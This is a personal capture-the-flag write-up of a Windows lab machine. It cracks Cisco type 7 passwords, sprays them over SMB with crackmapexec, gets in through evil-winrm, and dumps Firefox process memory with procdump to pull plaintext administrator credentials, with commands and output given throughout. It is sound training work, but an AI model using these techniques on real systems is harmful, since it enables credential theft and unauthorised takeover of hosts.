Immeditaley checked web app and found basic configs in there for a cisco router 

```bash
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

Q4)sJu\Y8qz*A3?d

$uperP@ssword - decrypted using an online website

stalth1agent 

combining with the users there 

```bash
cme smb 10.129.96.157 -u users.txt -p passwords.txt --rid-brute
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
SMB         10.129.96.157   445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.129.96.157   445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)

```

of particular use may be the full username list in SMB from the —brute

```bash
Administrator 
Guest 
DefaultAccount 
WDAGUtilityAccount 
Hazard 
support 
Chase 
Jason 

```

entering this again through cme we get 

```bash

SupportDesk\Chase: Q4)sJu\Y8qz*A3?d 

meaning we have chase too

```

so 

```bash
hazard:stealth1agent
Chase: Q4)sJu\Y8qz*A3?d
Two combos lets see what we can do -
```

```bash
evil-winrm -i 10.129.96.157 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents>
```

user.txt

whoami /priv yields little

So i decided to run winpeas and found some interesting ones 

```powershell
Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\key4.db
È Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```

So i tried sharpweb but couldnt pull any creds so i found online to use proc dump! 

```powershell
C:\Users\Chase> .\procdump64.exe -ma 7068 -accepteula firefox.dmp
```

The -ma denotes the PID process for firefox i found this through an online xcript

```powershell
Get-Process | Where-Object {$_.ProcessName -like "firefox*"} | Select-Object Id, ProcessName
```

investigating the file with the following we find creds

```powershell
strings firefox.dmp |grep -ie "login_username\|login_password"
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

Clear admin creds and enter into evil winrm and!

```powershell
evil-winrm -i 10.129.96.157 -u administrator -p '4dD!5}x/re8]FBuZ'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

So, what lessons are learned… 

Well.. first off we had a nice refresher in basic password spraying so you get a list and you cme spray

```powershell
cme smb 10.129.96.157 -u users.txt -p passwords.txt --rid-brute
```

(Remember to run twice with any new users! We discovered user.txt this way)

For post exploit we use winpeas and discovered firefox key could be vulnerable and after trying the winpeas reccomended SharpWeb it didnt work BUT

```powershell
C:\Users\Chase> .\procdump64.exe -ma 7068 -accepteula firefox.dmp
```

Proc dump did!

Lesson learned : Check browser stuff ;)
